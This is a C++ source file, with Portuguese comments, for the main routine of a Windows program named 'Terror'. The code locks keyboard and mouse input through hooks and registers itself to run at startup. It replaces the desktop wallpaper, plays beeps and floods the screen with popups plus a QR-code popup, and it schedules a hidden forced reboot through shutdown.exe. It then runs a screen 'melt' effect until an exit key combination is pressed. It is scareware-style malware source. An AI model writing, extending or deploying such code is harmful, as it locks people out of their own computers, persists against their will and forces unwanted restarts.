// main.cpp — Orquestração dos casos de uso do Terror
// Compilar: build.bat
#include "pch.h"
#include "globals.h"
#include "helper.h"
#include "registry.h"
#include "persistence.h"
#include "input_lock.h"
#include "wallpaper.h"
#include "beep.h"
#include "popup.h"
#include "melt.h"
#include "qr_popup.h"

// ── UC1: Inicialização ────────────────────────────────────────────────────────
static void UseCaseInit() {
    g_mainThreadId = GetCurrentThreadId();
    SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
    SW = GetSystemMetrics(SM_CXSCREEN);
    SH = GetSystemMetrics(SM_CYSCREEN);
    g_rng.seed((unsigned)std::chrono::high_resolution_clock::now()
               .time_since_epoch().count());
    InitBeepWav();
}

// ── UC2: Roubar foco e travar input imediatamente ────────────────────────────
static HWND UseCaseLockInputNow(HINSTANCE hInst) {
    InstallHooks();
    WNDCLASSW wc={};
    wc.lpfnWndProc=DefWindowProcW; wc.hInstance=hInst; wc.lpszClassName=L"LockWin";
    RegisterClassW(&wc);
    HWND hLock=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
        L"LockWin",L"",WS_POPUP,SW/2,SH/2,1,1,nullptr,nullptr,hInst,nullptr);
    ShowWindow(hLock,SW_SHOW);
    SetForegroundWindow(hLock);
    LockInputFull();
    return hLock;
}

// ── UC3: Persistência e preparação do ambiente (primeira execução) ────────────
static void UseCaseSetupPersistence(const wchar_t* exePath) {
    RegisterPersistence(exePath);
    SaveOriginalWallpaper();
    SetFallbackWallpaperNow();
    std::thread(DownloadWallpaperAsync).detach();
    ShowDesktop();
}

// ── UC4: Flood de popups + popup QR principal ─────────────────────────────────
static bool UseCasePopupPhase() {
    std::thread(PopupFloodThread).detach();  // popups secundários (z baixo)
    std::thread(QrPopupThread).detach();     // popup QR principal (z alto)
    DWORD t0=GetTickCount(); MSG m;
    while(g_running && (GetTickCount()-t0)<500)
        if(PeekMessageW(&m,nullptr,0,0,PM_REMOVE)){
            if(m.message==WM_QUIT){g_running=false;break;}
            TranslateMessage(&m); DispatchMessageW(&m);
        }
    return g_running.load();
}

// ── UC5: Shutdown agendado ────────────────────────────────────────────────────
static void UseCaseScheduleShutdown() {
    if (!SHUTDOWN_ENABLED) return;
    std::thread([]{
        Sleep((DWORD)SHUTDOWN_DELAY_SECONDS * 1000);
        if(g_running.load())
            RunHidden(L"C:\\Windows\\System32\\shutdown.exe /r /t 0 /f");
    }).detach();
}

// ── UC6: Cleanup e restauração completa do sistema ───────────────────────────
static void UseCaseCleanup() {
    UnlockInput();
    g_running=false;
    RemoveHooks();
    StopBeep();
    RunHidden(L"C:\\Windows\\System32\\shutdown.exe /a");
    UnregisterPersistence();
    RestoreOriginalWallpaper();
    delete[] g_wavBuf; g_wavBuf=nullptr;
}

// ── WinMain ───────────────────────────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR lpCmdLine, int) {
    UseCaseInit();                           // UC1: dimensões, RNG, áudio
    HWND hLock = UseCaseLockInputNow(hInst); // UC2: trava input AGORA

    bool fromBat = IsStartedFromBat(lpCmdLine);
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);

    if(!fromBat)
        UseCaseSetupPersistence(exePath);    // UC3: persist + wallpaper

    StartBeep();

    if(!UseCasePopupPhase()) goto cleanup;   // UC4: flood + QR popup

    if(!fromBat)
        UseCaseScheduleShutdown();           // UC5: shutdown em 120s

    DestroyWindow(hLock);
    RunMelt(hInst);                          // UC6: melt até combo de saída

cleanup:
    UseCaseCleanup();                        // UC7: restaura tudo
    return 0;
}
